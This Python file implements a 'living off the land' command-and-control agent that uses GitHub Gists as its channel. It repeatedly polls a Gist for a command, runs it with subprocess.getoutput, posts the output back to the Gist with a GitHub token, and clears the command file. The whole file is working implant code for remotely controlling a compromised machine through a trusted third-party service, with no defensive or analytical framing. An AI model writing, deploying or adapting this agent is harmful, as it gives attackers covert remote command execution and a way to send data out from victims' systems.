import requests
import json
import logging
import time

GIST_API_URL = "https://api.github.com/gists"

def get_gist_content(gist_id):
    """Retrieves the content of a specific file in a Gist."""
    try:
        response = requests.get(f"{GIST_API_URL}/{gist_id}")
        if response.status_code == 200:
            gist_data = response.json()
            # Assuming the command is in the first file of the Gist
            filename = list(gist_data['files'].keys())[0]
            return gist_data['files'][filename]['content']
        else:
            logging.error(f"Failed to get Gist {gist_id}. Status: {response.status_code}")
            return None
    except Exception as e:
        logging.error(f"Error getting Gist content: {e}")
        return None

def update_gist(gist_id, filename, content, github_token):
    """Updates a specific file in a Gist."""
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github.v3+json",
    }
    data = {
        "files": {
            filename: {
                "content": content
            }
        }
    }
    try:
        response = requests.patch(f"{GIST_API_URL}/{gist_id}", headers=headers, json=data)
        if response.status_code == 200:
            logging.info(f"Gist {gist_id} updated successfully.")
            return True
        else:
            logging.error(f"Failed to update Gist {gist_id}. Status: {response.status_code}, Response: {response.text}")
            return False
    except Exception as e:
        logging.error(f"Error updating Gist: {e}")
        return False

def lotl_agent(gist_id, github_token, sleep_interval=60):
    """
    The main loop for the LOTL C2 agent using GitHub Gists.
    """
    logging.info(f"LOTL C2 agent started. Polling Gist ID: {gist_id}")

    command_filename = "command.txt" # The file within the Gist to poll
    output_filename = "output.txt"   # The file to write output back to

    while True:
        try:
            command = get_gist_content(gist_id)
            if command and command.strip() != "waiting...":
                logging.info(f"Received command: {command}")

                # Execute the command
                import subprocess
                output = subprocess.getoutput(command)

                # Post the output back to the Gist
                update_gist(gist_id, output_filename, output, github_token)

                # Clear the command file
                update_gist(gist_id, command_filename, "waiting...", github_token)

            else:
                logging.info("No new command found. Sleeping.")

        except Exception as e:
            logging.error(f"Error in LOTL agent loop: {e}")

        time.sleep(sleep_interval)